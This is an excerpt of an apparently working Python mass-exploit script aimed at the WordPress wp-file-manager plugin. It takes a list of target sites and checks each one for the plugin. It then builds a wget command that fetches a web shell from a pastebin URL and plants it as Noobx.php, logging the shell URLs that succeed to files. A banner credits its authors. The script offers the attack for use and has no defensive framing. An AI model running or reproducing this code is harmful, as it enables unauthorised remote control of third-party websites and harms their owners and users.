...
linko = "https://pastebin.com/raw/brjiCbDT"


def uploadshell(i):
	m = 'wget ' + linko + ' -O Noobx.php'
	...
	if b'\x89PNG\r\n\x1a' in r:
		print("\033[92m[+] Upload 2.1 .. Done\n SHELL : %s/wp-content/plugins/wp-file-manager/lib/files/Noobx.php" % i)
		open('0xtn-exp/shells.txt', 'a').write(i + "/wp-content/plugins/wp-file-manager/lib/files/Noobx.php\n")
	if b'\x89PNG\r\n\x1a' in r2:
  ...
  try:
    if wp(i):  # check if site=wordpress or no +plugin
     ...
     if 'windows' in str(requests.get(shell).text).lower() or 'linux' in str(requests.get(shell).text).lower():
       ...
       open('0xtn-exp/ups.txt', 'a').write(shell + "\n")
       uploadshell(i)
    else:
...
print("""\033[93m
 ...
 {a}Right {b}: {a}git@w4fz5uck5
 {b}[{a}ReCoder{b}] : {a}Noob-Attacker
""".format(a="\033[92m", b="\033[94m"))
sites = open(input('\033[94m[\033[92mSites\033[94m]:\033[92m '), 'r').read().splitlines()
